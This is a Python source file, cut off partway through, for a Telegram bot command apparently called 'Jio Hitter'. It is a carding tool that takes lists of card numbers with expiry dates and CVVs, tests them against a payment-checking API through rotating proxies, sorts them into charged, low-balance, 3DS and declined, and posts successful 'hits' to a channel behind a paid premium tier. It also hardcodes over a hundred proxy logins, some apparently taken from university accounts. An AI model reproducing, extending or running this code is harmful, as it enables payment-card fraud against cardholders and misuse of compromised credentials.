import re
import random
import time
import logging
import asyncio
import html
from urllib.parse import quote
from typing import List, Dict, Optional, Any, Tuple

import aiohttp
from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest

from database import get_user_credits, update_credits, create_user, is_owner_user
from sub import get_premium_status


router = Router()
logger = logging.getLogger(__name__)

JIO_SESSIONS: Dict[int, Dict[str, Any]] = {}
MAX_CARDS = 10
RESULTS_PER_PAGE = 10
UPDATE_EVERY = 10
PARALLEL_LIMIT = 1
HIT_CHANNEL_ID = -1003744006874
BOT = "https://t.me/Try_Low"

API_URL = "https://doom1.up.railway.app/check"

FREE_USE_LIMIT = 3
FREE_USAGE: Dict[int, int] = {}


EMOJI_CHARGED = "5427168083074628963"
EMOJI_INSUFFICIENT = "6100515480735321747"
EMOJI_DECLINED = "5273914604752216432"
EMOJI_STOP = "6100541628496219252"


PROXIES = [
    # ── Raw IPs ──
    "103.156.91.173:58798:zqrn9y5d:zQRN9y5d",
    "103.161.113.230:18491:dz46cabj:ksuRcKlNqJMU",
    "103.183.121.128:58122:3dfw7c6x:oSeqx0CNeV0k",
    "103.183.121.211:11657:azqdr5vn:71WCPuMwyc72",
    "103.183.121.59:34219:y7g4dd8d:Buw96jtGFKA5",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "103.204.109.189:12345:tickets:proxyon145",
    "104.160.17.116:12345:tickets:proxyon145",
    "107.150.71.197:12345:tickets:proxyon145",
    "107.150.71.30:12345:tickets:proxyon145",
    "107.172.241.122:12345:tickets:proxyon145",
    "107.173.112.194:12345:tickets:proxyon145",
    "135.148.117.75:59813:oldg6k2r:oLdG6k2R",
    "138.94.218.193:12345:tickets:proxyon145",
    "153.121.71.115:822:socialwire:87xb2kziRk4xa",
    "161.0.1.119:12345:tickets:proxyon145",
    "161.0.1.13:12345:tickets:proxyon145",
    "162.212.170.252:12345:tickets:proxyon145",
    "162.212.170.77:12345:tickets:proxyon145",
    "168.228.46.128:12345:tickets:proxyon145",
    "168.228.46.189:12345:tickets:proxyon145",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "181.177.102.240:12345:tickets:proxyon145",
    "181.215.16.247:12345:tickets:proxyon145",
    "185.122.170.10:12345:tickets:proxyon145",
    "185.122.170.73:12345:tickets:proxyon145",
    "190.123.219.12:12345:tickets:proxyon145",
    "190.123.219.34:12345:tickets:proxyon145",
    "191.102.165.164:12345:tickets:proxyon145",
    "192.227.238.145:12345:tickets:proxyon145",
    "193.254.17.97:64708:1DnugnypC:4yPtzMd3f",
    "194.33.9.114:64170:nWtrJqsb:RYYEE72Y",
    "194.33.9.136:49520:nWtrJqsb:RYYEE72Y",
    "196.196.23.136:12345:tickets:proxyon145",
    "196.196.23.45:12345:tickets:proxyon145",
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "196.247.205.113:12345:tickets:proxyon145",
    "196.247.205.228:12345:tickets:proxyon145",
    "196.247.205.48:12345:tickets:proxyon145",
    "196.247.205.88:12345:tickets:proxyon145",
    "196.247.205.91:12345:tickets:proxyon145",

    # ── 202.28.17.8 — Thai university pool ──
    "202.28.17.8:8080:s5802016810053:1549900215617",
    "202.28.17.8:8080:s6003026810028:1720800122226",
    "202.28.17.8:8080:s6202052810029:78496978",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "202.28.17.8:8080:s6402013510115:s1609900520681",
    "202.28.17.8:8080:songponp:neung1nakub",

    # ── More raw IPs ──
    "23.104.162.39:12345:tickets:proxyon145",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "45.145.162.63:58536:nWtrJqsb:RYYEE72Y",
    "5.157.5.100:12345:tickets:proxyon145",
    "5.157.5.154:12345:tickets:proxyon145",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "50.3.137.165:12345:tickets:proxyon145",
    "50.3.137.177:12345:tickets:proxyon145",
    "51.195.198.170:36647:fwos7n0b:fWOS7n0B",
    "82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg",

    # ── pvdata.host pool (shared creds) ──
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cy-lim.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-fra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "im-bal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "in-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "is-rey.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lt-sia.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "no-osl.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "tw-tai.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ua-nik.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-lon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "vn-hoc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",

    # ── g-w.info free proxies ──
    "ca-free-proxy.g-w.info:59785:diehard33:3liubjnixc8456789i",
    "de-free-proxy.g-w.info:59784:smoothysuck:ublIUnbiybkvDfgg",
    "in-free-proxy.g-w.info:59783:dagandnorb:EdsAbQuamAn999",
    "uk-free-proxy.g-w.info:59782:meetthejack:8ohlsid7hlPenEdsAbQ",
    "us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY",

    # ── University proxies ──
    "authproxy.fju.edu.tw:3128:506061324:enya07141013",
    "proxy.sru.ac.th:8080:6115103001019:1819900293950",
    "proxy.sru.ac.th:8080:64052511005:3820800334521",
    "proxy.sru.ac.th:8080:jantawan.ban:jantawan.ban",
    "proxy.sru.ac.th:8080:patarawan.kah:patarawan.kah",
    "proxy.sru.ac.th:8080:prairat.kon:24122529**",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2",

    # ── cactussstp.com — au1 ──
    "au1.cactussstp.com:81:bvmbsmie:shibby2511",
    "au1.cactussstp.com:81:hughmuir2:lisamarie11",
    "au1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "au1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "au1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "au1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "au1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ca1 ──
    "ca1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ch1 ──
    "ch1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:81:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── es1 ──
    "es1.cactussstp.com:81:bvmbsmie:shibby2511",
    "es1.cactussstp.com:81:hughmuir2:lisamarie11",
    "es1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:81:yefprelf:dr2gsmab",
    "es1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "es1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "es1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "es1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "es1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "es1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── in1 ──
    "in1.cactussstp.com:81:bvmbsmie:shibby2511",
    "in1.cactussstp.com:81:hughmuir2:lisamarie11",
    "in1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:81:yefprelf:dr2gsmab",
    "in1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "in1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "in1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "in1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "in1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "in1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── it1 ──
    "it1.cactussstp.com:81:bvmbsmie:shibby2511",
    "it1.cactussstp.com:81:hughmuir2:lisamarie11",
    "it1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "it1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "it1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "it1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── lv1 ──
    "lv1.cactussstp.com:81:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:81:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:81:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── my1 ──
    "my1.cactussstp.com:81:bvmbsmie:shibby2511",
    "my1.cactussstp.com:81:hughmuir2:lisamarie11",
    "my1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "my1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "my1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "my1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "my1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── pt1 ──
    "pt1.cactussstp.com:81:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:81:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:81:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── ro1 ──
    "ro1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ru1 ──
    "ru1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk2 ──
    "uk2.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk3 ──
    "uk3.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us1 ──
    "us1.cactussstp.com:81:bvmbsmie:shibby2511",
    "us1.cactussstp.com:81:hughmuir2:lisamarie11",
    "us1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us2 ──
    "us2.cactussstp.com:81:bvmbsmie:shibby2511",
    "us2.cactussstp.com:81:hughmuir2:lisamarie11",
    "us2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us3 ──
    "us3.cactussstp.com:81:bvmbsmie:shibby2511",
    "us3.cactussstp.com:81:hughmuir2:lisamarie11",
    "us3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us4 ──
    "us4.cactussstp.com:81:bvmbsmie:shibby2511",
    "us4.cactussstp.com:81:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us4.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us4.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us4.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us6 ──
    "us6.cactussstp.com:81:bvmbsmie:shibby2511",
    "us6.cactussstp.com:81:hughmuir2:lisamarie11",
    "us6.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us6.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us6.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us6.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us6.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us9 ──
    "us9.cactussstp.com:81:bvmbsmie:shibby2511",
    "us9.cactussstp.com:81:hughmuir2:lisamarie11",
    "us9.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us9.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us9.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us9.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
]


ALLOWED_AMOUNTS = {
    "19", "29", "49", "69", "98",
    "129", "155", "199", "219", "239",
    "299", "349", "399", "449", "499",
    "599", "719", "839", "999", "1499",
}

USAGE_TEXT = (
    "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage: /jio &lt;phone&gt; &lt;amount&gt; &lt;card&gt;</b>\n\n"
    "<b>Available Amounts:</b>\n"
    "Small ➺ 19 • 29 • 49 • 69 • 98\n"
    "Low ➺ 129 • 155 • 199 • 219 • 239\n"
    "Medium ➺ 299 • 349 • 399 • 449 • 499\n"
    "High ➺ 599 • 719 • 839 • 999 • 1499"
)


RESP_OK_KEYWORDS = (
    "approved", "success", "successful", "charged", "captured",
    "succeeded", "paid", "order_paid", "processed", "payment_success",
)
REAL_OK_KEYWORDS = (
    "payment successful", "payment succeeded", "payment completed",
    "approved", "successfully processed", "charged successfully",
    "order has been paid", "payment was successful", "processed successfully",
)

INSUFFICIENT_KEYWORDS = (
    "insufficient", "insufficient_funds", "insufficient_funds",
    "not enough balance", "no enough balance", "low balance",
    "insufficient balance", "no balance", "unauthorized_transaction",
)

THREED_KEYWORDS = (
    "3ds", "3d secure", "3d_secure", "authentication", "auth_required",
    "require_action", "requires_action", "challenge", "captcha", "otp",
    "redirect", "verification required", "confirm the payment",
    "confirm your card", "card blocked from 3ds", "frictionless",
)

DECLINED_KEYWORDS = (
    "declined", "decline", "rejected", "do_not_honor", "do not honor",
    "not approved", "couldn't approve", "couldnt approve", "could not approve",
    "fraud", "expired", "invalid", "refused", "unable", "could not",
    "card_error", "generic_decline", "processing_error", "lost_card",
    "stolen_card", "call_issuer", "pickup_card", "not supported",
    "your card provider declined", "bank declined", "cannot be used",
)


def _contains(text: str, keywords: Tuple[str, ...]) -> bool:
    return any(k in text for k in keywords)


def map_jio_status(raw_response: str, real_response: str) -> Tuple[str, bool, str, str]:
    """Map API response -> (status, is_hit, emoji_id, short_display)."""
    resp = (raw_response or "").lower()
    real = (real_response or "").lower()


    if _contains(resp, RESP_OK_KEYWORDS) or _contains(real, REAL_OK_KEYWORDS):
        return "approved", True, EMOJI_CHARGED, "Payment Successful."


    if _contains(resp, INSUFFICIENT_KEYWORDS) or _contains(real, INSUFFICIENT_KEYWORDS):
        return "approved", True, EMOJI_INSUFFICIENT, "Your card does not have enough balance."


    if _contains(resp, THREED_KEYWORDS) or _contains(real, THREED_KEYWORDS):
        return "3ds", False, EMOJI_DECLINED, "3DS Required."


    if _contains(resp, DECLINED_KEYWORDS) or _contains(real, DECLINED_KEYWORDS):
        return "declined", False, EMOJI_DECLINED, "Payment Declined By Issuer."


    return "declined", False, EMOJI_DECLINED, str(real_response or raw_response or "Unknown Response")


def format_proxy_for_api(proxy: str) -> str:
    """Convert 'http://user:pass@host:port' -> 'host:port:user:pass'."""
    raw = proxy
    if raw.startswith("http://"):
        raw = raw[len("http://"):]
    elif raw.startswith("https://"):
        raw = raw[len("https://"):]
    if "@" in raw:
        userinfo, hostport = raw.split("@", 1)
        user, _, pwd = userinfo.partition(":")
        host, _, port = hostport.rpartition(":")
        return f"{host}:{port}:{user}:{pwd}"
    return raw


def build_api_url(number: str, amount: str, card: str, proxy_fmt: str) -> str:
    return (
        f"{API_URL}?cc={quote(card)}"
        f"&number={quote(number)}"
        f"&proxy={quote(proxy_fmt)}"
        f"&amount={quote(str(amount))}"
    )


async def process_jio_card(number: str, amount: str, card: str) -> Dict[str, Any]:
    """Call the Jio check API for a single card. Returns a result dict."""
    data = None
    last_error = None

    for attempt in range(3):
        proxy_fmt = format_proxy_for_api(random.choice(PROXIES))
        url = build_api_url(number, amount, card, proxy_fmt)

        try:
            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=120, connect=10)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        last_error = f"API Error: HTTP {resp.status}"
                        if attempt < 2:
                            await asyncio.sleep(0.5)
                            continue
                        break
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        last_error = "Invalid API Response"
                    break
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            last_error = f"Connection Error: {e}"
            if attempt < 2:
                await asyncio.sleep(0.5)
                continue
            break
        except Exception as e:
            last_error = f"Connection Error: {e}"
            break

    if data is None:
        return {
            "card": card,
            "resp": "error",
            "status": "error",
            "display": last_error or "Unknown Error",
            "emoji": EMOJI_DECLINED,
            "price": f"{amount} INR",
            "gateway": "jio",
            "is_hit": False,
        }

    raw_response = str(data.get("response", ""))
    real_response = data.get("real-response") or raw_response or "Unknown"
    price = data.get("price") or f"{amount} INR"
    gateway = data.get("gateway") or "jio"

    status, is_hit, emoji, display = map_jio_status(raw_response, real_response)

    return {
        "card": card,
        "resp": raw_response,
        "status": status,
        "display": display,
        "emoji": emoji,
        "price": str(price),
        "gateway": str(gateway),
        "is_hit": is_hit,
    }


async def send_hit_message(bot: Bot, response_type: str, amount: str, gateway: str,
                           user_name: str, user_id: int, emoji_id: str = None):
    """Sends the Hit Detect message to the channel."""
    try:
        user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"

        if emoji_id:
            emoji_part = f'<tg-emoji emoji-id="{emoji_id}">🔥</tg-emoji>'
        else:
            emoji_part = "🔥"

        hit_msg = (
            f"<b><a href='https://t.me/Try_Low'>[  ɧ ι 𝛕  ]</a></b> "
            f"<b>➺ Jɪᴏ Hɪᴛᴛᴇʀ [{html.escape(gateway)}]</b> {emoji_part}\n"
            f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount)}</b>\n"
            f"<b>Rᴀᴡ ➺</b> <code>{html.escape(response_type)}</code>\n"
            f"<b>Usᴇʀ ➺ {user_link}</b>"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ", url=BOT,
             icon_custom_emoji_id="5445104308884370368")]
        ])

        await bot.send_message(
            chat_id=HIT_CHANNEL_ID,
            text=hit_msg,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Failed to send hit message: {e}")


@router.message(F.text.startswith("/jio"))
async def jio_command(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"
    username = message.from_user.username


    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        used = FREE_USAGE.get(user_id, 0)
        if used >= FREE_USE_LIMIT:
            await message.reply(
                "<tg-emoji emoji-id=\"5447381715293074599\">⚠️</tg-emoji> <b>Fʀᴇᴇ Lɪᴍɪᴛ Rᴇᴀᴄʜᴇᴅ!</b>\n\n"
                f"Free users can use <b>Jɪᴏ Hɪᴛᴛᴇʀ</b> only <b>{FREE_USE_LIMIT}</b> times.\n"
                "💎 <b>Usᴇ /plan Tᴏ Uᴘɢʀᴀᴅᴇ Aɴᴅ Gᴇᴛ Uɴʟɪᴍɪᴛᴇᴅ Aᴄᴄᴇss.</b>",
                parse_mode="HTML"
            )
            return


    text_content = message.text or ""
    parts = text_content.split()

    if len(parts) < 3:
        await message.reply(USAGE_TEXT, parse_mode="HTML")
        return

    number = parts[1].strip()
    amount = parts[2].strip()
    raw_cards = parts[3:]


    if message.reply_to_message:
        replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_cards.extend(replied_text.split('\n'))


    if not re.fullmatch(r"\d{7,15}", number):
        await message.reply(USAGE_TEXT, parse_mode="HTML")
        return

    if amount not in ALLOWED_AMOUNTS:
        await message.reply(USAGE_TEXT, parse_mode="HTML")
        return


    card_pattern = re.compile(r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})')

    valid_cards = []
    seen = set()

    for item in raw_cards:
        match = card_pattern.search(item)
        if match:
            cc, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            formatted = f"{cc}|{mm}|{yy}|{cvv}"
            if formatted not in seen:
                seen.add(formatted)
                valid_cards.append(formatted)


    if len(valid_cards) > MAX_CARDS:
        await message.reply(
            f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Limit Exceeded!</b>\n\nMax allowed: {MAX_CARDS}",
            parse_mode="HTML"
        )
        return

    if not valid_cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return


    try:
